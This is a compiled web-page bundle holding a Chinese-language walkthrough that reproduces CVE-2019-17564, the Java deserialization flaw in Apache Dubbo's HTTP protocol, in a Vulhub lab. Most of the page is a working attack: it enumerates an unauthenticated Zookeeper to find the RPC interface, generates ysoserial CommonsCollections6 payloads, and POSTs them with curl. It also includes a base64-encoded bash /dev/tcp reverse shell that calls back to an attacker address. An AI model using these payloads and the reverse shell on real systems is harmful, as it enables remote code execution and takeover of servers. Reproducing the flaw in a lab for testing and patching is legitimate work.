import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as n,o as s,c as d,a as e,b as a,d as o,e as t}from"./app-58e4a7d6.js";const c={},l=t('<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache Dubbo 是一款高性能、轻量级的开源 Java RPC 服务框架。RPC，全称为 Remote Procedure Call，即远程过程调用，它是一个计算机通信协议。它允许像调用本地服务一样调用远程服务。</p><p>Dubbo 可以使用不同协议通信，当使用 http 协议时，Apache Dubbo 直接使用了 Spring 框架的 <code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code> 类做远程调用，而这个过程会读取 POST 请求的 Body 并进行反序列化，最终导致漏洞。</p><p>在 Spring 文档中，对 <code>HttpInvokerServiceExporter</code> 有如下描述，并不建议使用：</p><blockquote><p>WARNING: Be aware of vulnerabilities due to unsafe Java deserialization: Manipulated input streams could lead to unwanted code execution on the server during the deserialization step. As a consequence, do not expose HTTP invoker endpoints to untrusted clients but rather just between your own services. In general, we strongly recommend any other message format (e.g. JSON) instead.</p></blockquote><p>参考链接：</p>',6),p={href:"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html",target:"_blank",rel:"noopener noreferrer"},u={href:"https://www.anquanke.com/post/id/198747",target:"_blank",rel:"noopener noreferrer"},g={href:"https://paper.seebug.org/1128/",target:"_blank",rel:"noopener noreferrer"},h=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Dubbo 2.7.4及以前版本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Apache Dubbo 2.7.5 后 Dubbo 使用 <code>com.googlecode.jsonrpc4j.JsonRpcServer</code> 替换了 <code>HttpInvokerServiceExporter</code>。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>执行如下命令启动一个 Apache Dubbo 2.7.3 Provider：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问 <code>http://your-ip:8080</code>，服务器默认会返回 500 错误。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用该漏洞需要先知道目标 RPC 接口名，而 Dubbo 所有的 RPC 配置储存在 registry 中，通常使用 Zookeeper 作为 registry。如果能刚好找到目标的 Zookeeper 未授权访问漏洞，那么就可以在其中找到接口的名称与地址。</p>`,9),v={href:"https://zookeeper.apache.org/",target:"_blank",rel:"noopener noreferrer"},b=e("strong",null,"zkCli",-1),m=t(`<p>依次执行以下命令下载、解压、使用 zkCli 工具：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ wget https://dlcdn.apache.org/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz
$ tar xvf apache-zookeeper-3.7.0-bin.tar.gz
$ cd apache-zookeeper-3.7.0-bin/bin
$ ./zkCli -server target-ip:2181
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>连接后进入一个交互式控制台，使用 <code>ls</code> 即可列出其中所有节点，包括 Dubbo 相关的配置：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202222147467.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>获取到 RPC 接口名为 <code>org.vulhub.api.CalcService</code>。直接用 ysoserial 生成 CommonsCollections6 的 Payload 作为 POST Body 发送到 <code>http://your-ip:8080/org.vulhub.api.CalcService</code> 即可触发反序列化漏洞：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &quot;touch /tmp/awesome_poc&quot; &gt; 1.poc

$ curl -XPOST --data-binary @1.poc http://192.168.174.128:8080/org.vulhub.api.CalcService
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202222208473.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入 docker，命令 <code>touch /tmp/awesome_poc</code> 执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202222209355.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>反弹 shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1 
# base64编码
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}&quot; &gt; shell.poc

$ curl -XPOST --data-binary @shell.poc http://192.168.174.128:8080/org.vulhub.api.CalcService
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202222210040.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,13);function k(x,f){const r=n("ExternalLinkIcon");return s(),d("div",null,[l,e("ul",null,[e("li",null,[e("a",p,[a("https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html"),o(r)])]),e("li",null,[e("a",u,[a("https://www.anquanke.com/post/id/198747"),o(r)])]),e("li",null,[e("a",g,[a("https://paper.seebug.org/1128/"),o(r)])])]),h,e("p",null,[a("Vulhub 对外开放了 8080 端口和 2181 端口，其中 2181 即为 Zookeeper 的端口，本地下载 "),e("a",v,[a("Zookeeper"),o(r)]),a("，使用其中自带的"),b,a("即可连接到这台 Zookeeper 服务器。")]),m])}const S=i(c,[["render",k],["__file","Apache Dubbo Java反序列化漏洞 CVE-2019-17564.html.vue"]]);export{S as default};
